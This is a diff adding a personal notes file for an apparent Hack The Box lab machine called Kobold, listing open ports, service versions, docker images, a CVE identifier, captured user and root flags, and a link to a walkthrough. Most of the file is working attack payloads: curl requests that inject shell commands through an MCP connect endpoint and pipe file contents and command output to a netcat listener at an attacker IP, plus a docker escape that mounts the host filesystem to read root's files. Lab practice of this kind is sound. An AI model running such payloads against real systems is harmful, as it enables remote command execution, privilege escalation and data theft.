@@ -1,0 +1,95 @@
+Name = Kobold
+Difficulty = Easy
+OS = LInux
+
+IP = 10.129.28.114
+URL = kobold.htb
+
+##ports
+{
+22:ssh
+80:http
+443:https
+3552:golang
+}
+
+##versions
+{
+ssh:OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+http:nginx 1.24.0 (Ubuntu)
+https:nginx 1.24.0 (Ubuntu)
+golang:Golang net/http server
+arcane api:1.13.0
+	found json file at http://kobold.htb:3552/api/openapi.json
+}
+
+##things
+{
+admin_email:admin@kobold.htb
+docker_image_1:privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   5 months ago   122MB
+docker_image_2:mysql                         latest    f66b7a288113   2 months ago   922MB
+}
+
+##exploits
+{
+CVE-2026-23520
+}
+
+##flags
+{
+user:64f85ddb7c63b2d40ebdde49f2141ca3
+root:9cb12ad5e3551b0087a971a80e4709c4
+}
+
+##payloads
+{
+#user:
+curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \                                        
+-H "Content-Tyoe: application/json" \
+-d '{
+        "serverConfig": {
+                "command": "bash",
+                "args": ["-c", "cat /home/ben/user.txt | nc 10.10.16.151 4444"],
+                "env": {}
+        },
+        "serverId": "user"
+}'
+#idcheck:
+curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \                                        
+-H "Content-Tyoe: application/json" \
+-d '{
+        "serverConfig": {
+                "command": "bash",
+                "args": ["-c", "id | nc 10.10.16.151 4444"],                    
+                "env": {}
+        },
+        "serverId": "idcheck"
+}'
+#docker:
+curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
+-H "Content-Tyoe: application/json" \
+-d '{
+        "serverConfig": {
+                "command": "sg",  
+                "args": ["docker", "-c", "docker images | nc 10.10.16.151 4444"],
+                "env": {}
+        },
+        "serverId": "docker" 
+}'
+#rootflag
+curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
+-H "Content-Type: application/json" \
+-d '{
+        "serverConfig": {
+                "command": "sg",
+                "args": ["docker", "-c", "docker run -u root -v /:/hostfs --rm --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt | nc -w 10.10.16.151 4444"],
+                "env": {}
+        },
+        "serverId": "rootflag"
+}'
+}
+
+##walkthroughs
+{
+https://www.ibrahimisiaqbolaji.com/2026/03/kobold-htb-write-up.html?m=1
+}
